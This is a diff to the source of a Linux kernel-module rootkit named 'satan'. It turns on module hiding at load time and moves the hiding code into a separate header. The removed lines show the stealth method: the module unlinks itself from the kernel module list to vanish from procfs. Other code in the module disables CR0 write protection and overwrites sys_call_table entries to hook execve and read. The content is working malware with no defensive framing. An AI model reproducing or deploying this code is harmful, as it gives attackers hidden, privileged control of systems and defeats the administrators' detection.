@@ -3,6 +3,8 @@
 #include <linux/kallsyms.h>
 #include <linux/module.h>
 
+#include "hide.h"
+
 #define BRUTEFORCE_ADDR_BEGIN 0xc0000000
 #define BRUTEFORCE_ADDR_END 0xe0000000
 
@@ -18,15 +20,11 @@
                 write_cr0(read_cr0() | 0x10000);                   \
         } while (0);
 
-static bool is_hidden = false;
 static unsigned long **sys_call_table_ptr = NULL;
 static unsigned long *real_sys_read = NULL;
 static unsigned long ptr = 0;
-static struct list_head *module_prev = NULL;
 
 static void satan_locate_sys_call_table(void);
-static bool satan_is_hidden(void);
-static void satan_set_hidden(bool hidden);
 
 
 /* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
@@ -47,14 +45,14 @@ static int __init satan_init(void)
 {
         pr_info("satan: initializing rootkit...\n");
         satan_locate_sys_call_table();
-        //satan_set_hidden(true);
+        satan_set_hidden(true);
         return 0;
 }
 
 static void __exit satan_exit(void)
 {
         pr_info("satan: shutting down...\n");
-        //satan_set_hidden(false);
+        satan_set_hidden(false);
 
         CR0_WP_DISABLE {
                 sys_call_table_ptr[__NR_execve] = (unsigned long *) real_execve;
@@ -88,28 +86,6 @@ static void satan_locate_sys_call_table(void)
                 pr_info("satan: new sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
         }
 }
-
-static bool satan_is_hidden(void)
-{
-        return is_hidden;
-}
-
-static void satan_set_hidden(bool hidden)
-{
-        if (is_hidden == hidden)
-                return;
-
-        if (hidden) {  // hide module
-                module_prev = THIS_MODULE->list.prev;  // backup prev node in module list.
-                list_del(&THIS_MODULE->list);  // removes from procfs
-        } else {  // unhide module
-                list_add(&THIS_MODULE->list, module_prev);
-                module_prev = NULL;
-        }
-
-        is_hidden = hidden;
-}
-
 
 module_init(satan_init);
 module_exit(satan_exit);
